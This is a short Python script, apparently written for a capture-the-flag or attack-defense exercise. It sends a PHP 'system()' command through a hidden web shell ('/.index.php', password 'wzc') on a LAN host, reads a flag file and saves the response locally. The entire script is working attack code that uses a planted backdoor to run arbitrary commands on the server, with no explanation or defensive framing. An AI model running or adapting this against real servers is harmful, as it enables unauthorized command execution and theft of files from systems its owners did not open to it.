import requests
url="http://192.168.0.108"
shell="/.index.php"
passwd="wzc"
port='80'
payload={
    passwd:"system(\'type flag.txt\');"
    #cd c:\\flag && type flag.txt
}
url1=url+':'+port+shell
print(url1)
response=requests.post(url1,payload,timeout=10)
response.encoding=response.apparent_encoding
print(response.text)
file=open("flag.txt","a")
file.write(response.text)
file.close()

